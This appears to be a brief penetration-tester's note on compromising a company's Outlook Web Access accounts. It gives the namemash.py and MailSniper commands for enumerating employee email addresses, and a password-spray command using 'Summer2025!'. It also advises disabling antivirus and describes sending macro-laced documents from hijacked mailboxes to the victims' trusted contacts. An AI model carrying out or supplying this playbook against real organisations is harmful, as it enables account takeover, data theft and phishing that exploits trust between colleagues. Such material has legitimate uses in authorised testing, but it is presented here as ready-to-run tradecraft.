Once we browse the client's site we discover the full name of the employees in order to determine their email addresses. Note, in some cases, the email accounts will be posted on their website; this makes our job easier.
#######
Use namemash.py with a list of FirstName+LastName to determine all sort of name combinations for emails used by the company.
namemash.py <file_name>
######
MailSniper.ps1
(Remember to disabled your Windows Defender or any other active AV you run)
import-module MailSniper.ps1
then,
Invoke-UsernameHarvestOWA -ExchHostname Mailserver.company.com -Domain company.com -UserList emailaccounts.txt -OutFile valid-accounts.txt
######
Once the email accounts are validated, we can bruteforce the password for each valid account with a default password such as 'Summer2025!':
Invoke-PasswordSprayOWA -ExchHostname mail.company.com -UserList valid-accounts.txt -Password Summer2025!

Once we find something we can log on to the account and search for other email accounts, password, sensitive documents, and even email other trusted email accounts links and documents to leverage the victim's trust in order to compromise more accounts.
We can email documents, links, and email documents back to the user the victim received it from with a malicious macro enabled.

######



